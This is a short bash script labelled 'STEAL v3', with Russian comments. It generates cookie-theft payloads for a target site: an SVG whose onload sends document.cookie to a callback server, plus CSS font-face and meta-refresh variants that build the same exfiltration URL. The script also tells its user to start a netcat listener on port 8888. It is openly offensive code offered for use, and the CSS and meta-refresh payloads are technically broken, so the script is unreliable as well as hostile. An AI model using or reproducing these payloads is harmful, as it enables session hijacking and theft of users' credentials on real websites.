#!/bin/bash
TARGET=$1
CALLBACK=${2:-"http://your-server.com:8888"}
[ -z "$TARGET" ] && echo "Usage: $0 http://target.com [callback]" && exit 1

echo "[STEAL v3] Готовлю кражу cookie через CSS-инъекцию..."

# Payload через CSS (никто не проверяет CSS на XSS)
cat > /tmp/shadow_steal.css << EOF
@font-face { font-family: 'x'; src: url('$CALLBACK/font?c=' + document.cookie); }
* { font-family: 'x'; }
EOF

# Payload через SVG
cat > /tmp/shadow_steal.svg << EOF
<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('$CALLBACK?c='+document.cookie)">
<rect width="100%" height="100%" fill="transparent"/>
</svg>
EOF

# Payload через meta refresh (старый но работает)
echo "<meta http-equiv='refresh' content='0;url=$CALLBACK?c='+document.cookie>" > /tmp/shadow_steal.html

echo "[STEAL v3] Payloads готовы:"
echo "  CSS: /tmp/shadow_steal.css"
echo "  SVG: /tmp/shadow_steal.svg"
echo "  HTML: /tmp/shadow_steal.html"
echo "[STEAL v3] Подними слушатель: nc -lvp 8888"
